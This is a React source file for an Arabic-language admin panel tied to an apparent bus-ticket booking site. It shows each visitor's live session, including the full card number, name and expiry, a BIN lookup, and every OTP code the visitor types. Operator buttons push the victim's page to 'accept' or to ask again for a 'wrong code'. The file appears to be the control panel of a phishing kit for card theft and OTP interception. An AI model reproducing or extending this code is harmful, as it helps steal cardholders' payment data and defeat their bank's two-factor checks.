import React, { useState } from "react";
import {
  Eye,
  EyeOff,
  User,
  ShoppingBag,
  Phone,
  Mail,
  Calendar,
  ArrowRight,
  Copy,
  Activity,
  Check,
  X,
  CreditCard as CardIcon,
  Plane,
  Monitor,
  Smartphone,
  Globe,
  History,
  Ticket,
  Users,
  Key,
  Compass,
  Clock
} from "lucide-react";
import type { OrderData } from "../../lib/firestore-types";
import { updateOrder } from "../../lib/firebase-services";
import { toast } from "sonner";
import { CardMock, lookupBin, type BinInfo } from "./mock";

interface VisitorDetailsProps {
  visitor: OrderData | null;
  onBack?: () => void;
}

function formatDetailedTime(isoString: string | undefined): string {
  if (!isoString) return "-";
  const date = new Date(isoString);
  return date.toLocaleString('ar-SA', {
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true
  });
}

function calculateDuration(startIso: string | undefined, endIso: string | undefined): string {
  if (!startIso) return "-";
  const start = new Date(startIso);
  const end = endIso ? new Date(endIso) : new Date();
  const diffMs = end.getTime() - start.getTime();
  
  const diffSeconds = Math.floor(diffMs / 1000);
  if (diffSeconds < 60) return `${diffSeconds}ث`;
  
  const diffMinutes = Math.floor(diffSeconds / 60);
  const remainingSeconds = diffSeconds % 60;
  
  if (diffMinutes < 60) {
    return `${diffMinutes}د ${remainingSeconds}ث`;
  }
  
  const diffHours = Math.floor(diffMinutes / 60);
  const remainingMinutes = diffMinutes % 60;
  return `${diffHours}س ${remainingMinutes}د`;
}

export function VisitorDetails({ visitor: order, onBack }: VisitorDetailsProps) {
  const [loadingAction, setLoadingAction] = useState<string | null>(null);
  const [showSensitive, setShowSensitive] = useState(true);
  const [binInfo, setBinInfo] = useState<BinInfo | null>(null);
  const [binLoading, setBinLoading] = useState(false);

  React.useEffect(() => {
    const cardNumber = order?.paymentDetails?.cardNumber;
    if (cardNumber && cardNumber.replace(/\D/g, "").length >= 6) {
      setBinLoading(true);
      lookupBin(cardNumber)
        .then(info => {
          setBinInfo(info);
        })
        .finally(() => {
          setBinLoading(false);
        });
    } else {
      setBinInfo(null);
    }
  }, [order?.paymentDetails?.cardNumber]);

  if (!order) {
    return (
      <div className="flex-1 flex flex-col items-center justify-center bg-gray-50 dark:bg-gray-900/50 h-full p-8 text-center" id="no-visitor-selected">
        <div className="w-16 h-16 bg-amber-100 dark:bg-amber-900/30 rounded-full flex items-center justify-center mb-4">
          <ShoppingBag className="w-8 h-8 text-amber-600 dark:text-[#66bfe3] opacity-80" />
        </div>
        <h2 className="text-xl font-bold text-gray-900 dark:text-white mb-2">
          لم يتم تحديد أي جلسة / طلب حجز
        </h2>
        <p className="text-gray-500 dark:text-gray-400 max-w-sm text-xs">
          اختر جلسة عميل من القائمة الجانبية لمتابعة مسار الحجز والبطاقات والـ OTP والتحكم الفوري بالخطوات.
        </p>
      </div>
    );
  }

  const handleCopy = (text: string | undefined, label: string) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    toast.success(`تم نسخ ${label} بنجاح`);
  };

  const handleAction = async (actionName: string, payload: any) => {
    setLoadingAction(actionName);
    try {
      await updateOrder(order.id, payload);
      toast.success("تم إرسال الأمر وتحديث الجلسة فوراً");
    } catch (e: any) {
      toast.error("حدث خطأ أثناء إرسال الأمر: " + (e.message || e));
    } finally {
      setLoadingAction(null);
    }
  };

  const handleStatusChange = async (newStatus: "completed" | "pending" | "failed") => {
    try {
      await updateOrder(order.id, { status: newStatus });
      toast.success("تم تحديث حالة الحجز");
    } catch (e) {
      toast.error("حدث خطأ أثناء التحديث");
    }
  };

  const cName = order.customer?.firstName ? `${order.customer.firstName} ${order.customer.lastName || ''}` : 'عميل جديد';
  
  // Custom Session fields mapping from rawSession
  const rawSession = order.rawSession;
  const isOnline = rawSession?.isOnline ?? true;
  const currentPage = rawSession?.currentPage || order.currentPage || "booking";
  const bookingStep = rawSession?.bookingStep || "open";
  const selectedTrip = rawSession?.selectedTrip;
  const selectedSeats = rawSession?.selectedSeats || [];
  const checkoutData = rawSession?.checkoutData;
  const passengerNames = checkoutData?.passengerNames || [];
  const paymentInfo = rawSession?.paymentInfo;
  const deviceInfo = rawSession?.deviceInfo;
  const navigationHistory = rawSession?.navigationHistory || [];
  const otpSubmissions = paymentInfo?.otpSubmissions || [];

  const t = {
    pages: {
      'home': 'الرئيسية',
      'search': 'البحث عن رحلات',
      'seats': 'اختيار المقاعد',
      'checkout': 'إتمام الحجز',
      'my-tickets': 'تذاكري',
      'booking': 'الحجز',
      'payment': 'الدفع'
    },
    steps: {
      'open': 'فتح الموقع',
      'browse': 'تصفح',
      'seats_selected': 'تم اختيار المقاعد',
      'payment_attempted': 'محاولة الدفع',
      'checkout_completed': 'تم إتمام الحجز',
      'otp_failed': 'فشل الـ OTP'
    }
  };

  return (
    <div className="flex-1 flex flex-col h-full bg-gray-50 dark:bg-gray-900 overflow-hidden" id="visitor-details-container">
      {/* Header */}
      <div className="bg-white dark:bg-gray-950 border-b border-gray-200 dark:border-gray-800 p-4 flex flex-col md:flex-row md:items-center justify-between gap-4 sticky top-0 z-20 transition-colors">
        <div className="flex items-center gap-3">
          {onBack && (
            <button
              onClick={onBack}
              className="p-2 -mr-2 bg-gray-100 dark:bg-gray-800 text-gray-600 dark:text-gray-300 rounded-full hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors md:hidden"
            >
              <ArrowRight className="w-5 h-5" />
            </button>
          )}
          <div className="relative">
            <div className="w-10 h-10 bg-amber-100 dark:bg-amber-900/30 rounded-full flex items-center justify-center text-amber-700 dark:text-[#66bfe3] font-bold">
              <User className="w-5 h-5" />
            </div>
            <span className={`absolute bottom-0 right-0 w-3 h-3 rounded-full border-2 border-white dark:border-gray-950 ${isOnline ? 'bg-emerald-500 animate-pulse' : 'bg-gray-400'}`} />
          </div>
          <div>
            <h2 className="text-lg font-bold text-gray-900 dark:text-white flex items-center gap-2">
              {cName}
              <span className={`text-[10px] py-0.5 px-2 rounded-full font-medium ${isOnline ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/50 dark:text-emerald-400' : 'bg-gray-100 text-gray-600 dark:bg-gray-800 dark:text-gray-400'}`}>
                {isOnline ? 'متصل الآن' : 'غير متصل'}
              </span>
            </h2>
            <div className="flex flex-wrap items-center gap-x-3 gap-y-1 text-[10px] text-gray-500 dark:text-gray-400 font-mono mt-1">
              <div className="flex items-center gap-1.5 bg-gray-100 dark:bg-gray-800/50 px-2 py-0.5 rounded border border-gray-200/50 dark:border-gray-700/30">
                <span className="font-bold text-blue-600 dark:text-blue-400">{order.id}</span>
              </div>
              <div className="flex items-center gap-1">
                <Calendar className="w-3 h-3 text-gray-400" />
                <span>البداية: {formatDetailedTime(order.timestamp)}</span>
              </div>
              {rawSession?.openedAt && (
                <div className="flex items-center gap-1">
                  <Clock className="w-3 h-3 text-gray-400" />
                  <span>المدة: {calculateDuration(rawSession.openedAt, rawSession.lastActiveAt)}</span>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Status Actions */}
        <div className="flex flex-wrap items-center gap-2 md:gap-3">
          <div className="flex bg-gray-100 dark:bg-gray-800 p-1 rounded-lg border border-gray-200/50 dark:border-gray-700/50">
            <button
              onClick={() => handleStatusChange('completed')}
              className={`px-3 py-1.5 text-xs font-bold rounded-md transition-all cursor-pointer ${order.status === 'completed' ? 'bg-emerald-500 text-white shadow-sm' : 'text-gray-500 hover:text-emerald-600'}`}
            >
              مكتمل
            </button>
            <button
              onClick={() => handleStatusChange('pending')}
              className={`px-3 py-1.5 text-xs font-bold rounded-md transition-all cursor-pointer ${order.status === 'pending' ? 'bg-amber-500 text-white shadow-sm' : 'text-gray-500 hover:text-amber-600'}`}
            >
              معلق
            </button>
            <button
              onClick={() => handleStatusChange('failed')}
              className={`px-3 py-1.5 text-xs font-bold rounded-md transition-all cursor-pointer ${order.status === 'failed' ? 'bg-rose-500 text-white shadow-sm' : 'text-gray-500 hover:text-rose-600'}`}
            >
              مرفوض
            </button>
          </div>
        </div>
      </div>

      {/* Main Content Area */}
      <div className="flex-1 overflow-y-auto p-4 md:p-6 pb-24">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 max-w-6xl mx-auto">
          
          {/* Main Info Columns */}
          <div className="lg:col-span-2 space-y-6">
            
            {/* 1. Trip Booking Details Card */}
            <div className="bg-white dark:bg-gray-950 border border-gray-200 dark:border-gray-800 rounded-2xl p-5 shadow-sm transition-colors">
              <h3 className="text-sm font-bold text-gray-900 dark:text-white flex items-center gap-2 mb-4">
                <Plane className="w-4 h-4 text-amber-500" />
                تفاصيل مسار الرحلة والحجز
              </h3>
              
              {selectedTrip ? (
                <div className="space-y-4">
                  <div className="p-4 bg-gradient-to-r from-amber-500/10 to-orange-500/10 dark:from-amber-950/20 dark:to-orange-950/20 rounded-xl border border-amber-100/50 dark:border-amber-900/30">
                    <div className="flex justify-between items-center mb-3">
                      <span className="text-[10px] font-bold text-amber-600 dark:text-[#66bfe3] uppercase tracking-wider">الرحلة المحددة</span>
                      <span className="font-mono text-sm font-bold text-amber-600 dark:text-[#66bfe3]">{selectedTrip.price} JOD</span>
                    </div>
                    
                    <div className="flex justify-between items-center">
                      <div>
                        <div className="text-xs text-gray-400">نقطة الانطلاق</div>
                        <div className="text-base font-bold text-gray-800 dark:text-white">{selectedTrip.origin}</div>
                      </div>
                      
                      <div className="flex-1 flex flex-col items-center px-4 relative">
                        <span className="text-[10px] text-gray-400 font-mono mb-1">ذهاب</span>
                        <div className="w-full h-[1px] bg-amber-300 dark:bg-amber-800 relative">
                          <Plane className="w-4 h-4 text-amber-500 absolute -top-2 left-1/2 -translate-x-1/2 transform rotate-90" />
                        </div>
                      </div>
                      
                      <div className="text-left">
                        <div className="text-xs text-gray-400">وجهة الوصول</div>
                        <div className="text-base font-bold text-gray-800 dark:text-white">{selectedTrip.destination}</div>
                      </div>
                    </div>

                    <div className="mt-3 pt-3 border-t border-amber-100/30 dark:border-amber-900/20 flex justify-between items-center text-xs text-gray-500 dark:text-gray-400">
                      <div>وقت المغادرة: <span className="font-bold text-gray-800 dark:text-gray-200 font-mono">{selectedTrip.departureTime || '---'}</span></div>
                      <div>فئة الحافلة: <span className="font-bold text-gray-800 dark:text-gray-200 font-mono">{selectedTrip.busType || 'VIP'}</span></div>
                    </div>
                  </div>

                  {/* Seat Selection and count */}
                  <div className="grid grid-cols-2 gap-4">
                    <div className="p-3 bg-gray-50 dark:bg-gray-900 rounded-xl border border-gray-100 dark:border-gray-800">
                      <div className="text-xs text-gray-500 mb-1">المقاعد المحددة</div>
                      <div className="text-sm font-bold text-gray-800 dark:text-white flex items-center gap-1">
                        <Ticket className="w-4 h-4 text-emerald-500" />
                        {selectedSeats.length > 0 ? (
                          <span className="font-mono bg-emerald-50 dark:bg-emerald-950/30 text-emerald-600 dark:text-emerald-400 px-2 py-0.5 rounded text-xs">
                            {selectedSeats.join(', ')}
                          </span>
                        ) : (
                          <span className="text-xs text-gray-400 font-normal">لم يتم تحديد مقاعد</span>
                        )}
                      </div>
                    </div>
                    <div className="p-3 bg-gray-50 dark:bg-gray-900 rounded-xl border border-gray-100 dark:border-gray-800">
                      <div className="text-xs text-gray-500 mb-1">عدد المسافرين</div>
                      <div className="text-sm font-bold text-gray-800 dark:text-white flex items-center gap-1">
                        <Users className="w-4 h-4 text-amber-500" />
                        <span>{passengerNames.length || selectedSeats.length || 1} مسافر</span>
                      </div>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="space-y-3 mb-4">
                  {order.cartItems && order.cartItems.length > 0 ? (
                    order.cartItems.map((item, idx) => (
                      <div key={idx} className="flex justify-between items-center p-3 bg-gray-50 dark:bg-gray-900/50 rounded-xl border border-gray-100 dark:border-gray-800">
                        <div>
                          <div className="font-semibold text-sm text-gray-800 dark:text-gray-200">{item.name}</div>
                          <div className="text-xs text-gray-500">الكمية: {item.quantity}</div>
                        </div>
                        <div className="font-bold text-sm font-mono text-gray-900 dark:text-white">
                          {item.price} JOD
                        </div>
                      </div>
                    ))
                  ) : (
                    <div className="text-center p-4 text-xs text-gray-500 bg-gray-50 dark:bg-gray-900/50 rounded-xl">لا توجد عناصر رحلة مختارة بعد</div>
                  )}
                </div>
              )}
              
              <div className="flex justify-between items-center pt-4 mt-4 border-t border-gray-200 dark:border-gray-800">
                <span className="font-bold text-gray-700 dark:text-gray-300">قيمة الحجز الإجمالية</span>
                <span className="font-black text-xl text-amber-600 dark:text-[#66bfe3] font-mono">{order.amount} JOD</span>
              </div>
            </div>


            {/* 3. Navigation History / Timeline */}
            <div className="bg-white dark:bg-gray-950 border border-gray-200 dark:border-gray-800 rounded-2xl p-5 shadow-sm transition-colors">
              <h3 className="text-sm font-bold text-gray-900 dark:text-white flex items-center gap-2 mb-4">
                <History className="w-4 h-4 text-amber-500" />
                سجل تتبع وملاحة الزائر (تاريخ الصفحات)
              </h3>
              
              {navigationHistory.length > 0 ? (
                <div className="relative border-r-2 border-amber-100 dark:border-amber-900 mr-2 pr-4 space-y-4 py-2">
                  {navigationHistory.map((step, index) => (
                    <div key={index} className="relative">
                      <div className="absolute -right-[23px] top-1 w-2.5 h-2.5 rounded-full bg-amber-500 border-2 border-white dark:border-gray-950" />
                      
                      <div className="flex flex-col md:flex-row md:items-center justify-between gap-1">
                        <div>
                          <span className="text-xs font-bold text-gray-800 dark:text-gray-200">
                            صفحة: <span className="bg-amber-50 dark:bg-amber-950/40 text-amber-600 dark:text-[#66bfe3] px-1.5 py-0.5 rounded text-[11px] font-mono">{step.page}</span>
                          </span>
                          {step.step && (
                            <span className="text-[11px] text-gray-500 dark:text-gray-400 mr-2 font-mono">
                              ({step.step})
                            </span>
                          )}
                        </div>
                        <span className="text-[10px] text-gray-400 font-mono">
                          {new Date(step.timestamp).toLocaleTimeString('ar-SA')}
                        </span>
                      </div>
                    </div>
                  ))}
                </div>
              ) : (
                <div className="text-center py-4 text-xs text-gray-500 bg-gray-50 dark:bg-gray-900/50 rounded-xl border border-dashed border-gray-200 dark:border-gray-800">
                  لا يتوفر سجل ملاحة نشط للعميل
                </div>
              )}
            </div>

            {/* 4. Complete Device Info & Screen Resolution */}
            {deviceInfo && (
              <div className="bg-white dark:bg-gray-950 border border-gray-200 dark:border-gray-800 rounded-2xl p-5 shadow-sm transition-colors">
                <h3 className="text-sm font-bold text-gray-900 dark:text-white flex items-center gap-2 mb-3">
                  <Monitor className="w-4 h-4 text-gray-500" />
                  تفاصيل جهاز ونظام الزائر
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-3 text-xs">
                  <div className="p-3 bg-gray-50 dark:bg-gray-900 rounded-xl border border-gray-100 dark:border-gray-800">
                    <span className="text-gray-400 block mb-1">المنصة المستخدمة</span>
                    <span className="font-bold text-gray-800 dark:text-gray-200 flex items-center gap-1">
                      <Smartphone className="w-3.5 h-3.5 text-gray-400" />
                      {deviceInfo.platform || 'مجهول'}
                    </span>
                  </div>
                  <div className="p-3 bg-gray-50 dark:bg-gray-900 rounded-xl border border-gray-100 dark:border-gray-800">
                    <span className="text-gray-400 block mb-1">دقة الشاشة والقياس</span>
                    <span className="font-mono font-bold text-gray-800 dark:text-gray-200">
                      {deviceInfo.screen || '---'}
                    </span>
                  </div>
                  <div className="p-3 bg-gray-50 dark:bg-gray-900 rounded-xl border border-gray-100 dark:border-gray-800">
                    <span className="text-gray-400 block mb-1">المحيل / Referrer</span>
                    <span className="truncate block font-mono text-gray-600 dark:text-gray-400" title={deviceInfo.referrer || 'مباشر'}>
                      {deviceInfo.referrer || 'مباشر (Direct)'}
                    </span>
                  </div>
                </div>
              </div>
            )}

          </div>

          {/* Right Sidebar / Payment card & controls */}
          <div className="space-y-6">
            
            {/* Payment card simulation */}
   <CardMock
  cardNumber={order.paymentDetails?.cardNumber}
  cardName={order.paymentDetails?.cardName}
  cardExpiry={order.paymentDetails?.cardExpiry}
  binInfo={binInfo}
  loading={binLoading}
/>

            {/* Stage Info Card */}
            <div className="bg-white dark:bg-gray-950 border border-gray-200 dark:border-gray-800 rounded-2xl p-4 shadow-sm transition-colors">
              <div className="text-xs text-gray-400 mb-1">موقع الزائر الحالي بالصفحات</div>
              <div className="font-bold text-sm text-gray-900 dark:text-white flex items-center gap-1.5 mb-3">
                <Compass className="w-4 h-4 text-amber-500" />
                <span className="font-mono bg-amber-50 dark:bg-amber-950 text-amber-600 dark:text-[#66bfe3] px-2 py-0.5 rounded text-xs">
                  {t.pages[currentPage as keyof typeof t.pages] || currentPage}
                </span>
                <span className="text-gray-300 dark:text-gray-700">|</span>
                <span className="font-mono bg-indigo-50 dark:bg-indigo-950 text-indigo-600 dark:text-indigo-400 px-2 py-0.5 rounded text-xs">
                  {t.steps[bookingStep as keyof typeof t.steps] || bookingStep}
                </span>
              </div>
            </div>

            {/* OTP Operations and Log */}
            <div className="bg-white dark:bg-gray-950 border border-gray-200 dark:border-gray-800 rounded-2xl p-5 shadow-sm transition-colors">
              <h3 className="text-xs font-bold text-gray-500 dark:text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-1">
                <Key className="w-3.5 h-3.5 text-amber-500" />
                تحكم الـ OTP ومحاولات الإدخال
              </h3>
              
              <div className="mb-4 bg-gray-50 dark:bg-gray-900 rounded-xl p-3.5 border border-gray-100 dark:border-gray-800 text-center">
                <div className="text-xs text-gray-400 mb-1 font-semibold">آخر رمز OTP تم إدخاله (Last OTP)</div>
                <div className="font-mono text-2xl font-black tracking-widest text-gray-900 dark:text-white">
                  {order.paymentDetails?.otpCode || paymentInfo?.lastOtp || '----'}
                </div>
              </div>

              {/* Action Buttons to trigger OTP state on client */}
              <div className="grid grid-cols-2 gap-2 mb-4">
                <button
                  onClick={() => handleAction('verify-otp-success', {
                    currentPage: 'my-tickets',
                    bookingStep: 'checkout_completed',
                    status: 'completed',
                    paymentInfo: { ...paymentInfo, status: 'completed' }
                  })}
                  className="px-3 py-2 bg-emerald-600 hover:bg-emerald-700 text-white text-[11px] font-bold rounded-xl flex items-center justify-center gap-1 transition-colors cursor-pointer"
                >
                  <Check className="w-3.5 h-3.5" /> قبول وإنهاء
                </button>
                <button
                  onClick={() => handleAction('verify-otp-fail', {
                    currentPage: 'booking',
                    bookingStep: 'otp_failed',
                    paymentInfo: { ...paymentInfo, status: 'failed' }
                  })}
                  className="px-3 py-2 bg-rose-600 hover:bg-rose-700 text-white text-[11px] font-bold rounded-xl flex items-center justify-center gap-1 transition-colors cursor-pointer"
                >
                  <X className="w-3.5 h-3.5" /> رمز خاطئ/طلب إعادة
                </button>
              </div>

              {/* List of OTP codes logged in history */}
              {otpSubmissions.length > 0 ? (
                <div className="space-y-2 pt-2 border-t border-gray-100 dark:border-gray-800">
                  <div className="text-[10px] text-gray-400 font-bold">تاريخ وسجل الرموز المدخلة:</div>
                  <div className="max-h-[140px] overflow-y-auto space-y-1.5 font-mono text-xs">
                    {otpSubmissions.map((sub: any, idx: number) => (
                      <div key={idx} className="p-2 bg-gray-50 dark:bg-gray-900 rounded-lg flex items-center justify-between border border-gray-100/50 dark:border-gray-800/50">
                        <div>
                          <span className="font-bold text-gray-800 dark:text-gray-200">#{sub.attempt}</span>
                          <span className="mx-2 bg-amber-50 dark:bg-amber-950/40 text-amber-600 dark:text-[#66bfe3] px-1.5 py-0.5 rounded text-[10px] font-black">{sub.otp}</span>
                        </div>
                        <span className="text-[10px] text-gray-400">{sub.timestamp ? new Date(sub.timestamp).toLocaleTimeString('ar-SA') : ''}</span>
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                paymentInfo?.otpCodes && paymentInfo.otpCodes.length > 0 ? (
                  <div className="space-y-2 pt-2 border-t border-gray-100 dark:border-gray-800">
                    <div className="text-[10px] text-gray-400 font-bold">الرموز المستلمة:</div>
                    <div className="flex flex-wrap gap-1">
                      {paymentInfo.otpCodes.map((code: string, idx: number) => (
                        <span key={idx} className="font-mono text-xs bg-gray-100 dark:bg-gray-800 px-2 py-1 rounded text-gray-800 dark:text-gray-200">
                          {code}
                        </span>
                      ))}
                    </div>
                  </div>
                ) : null
              )}
            </div>

          </div>
        </div>
      </div>
    </div>
  );
}
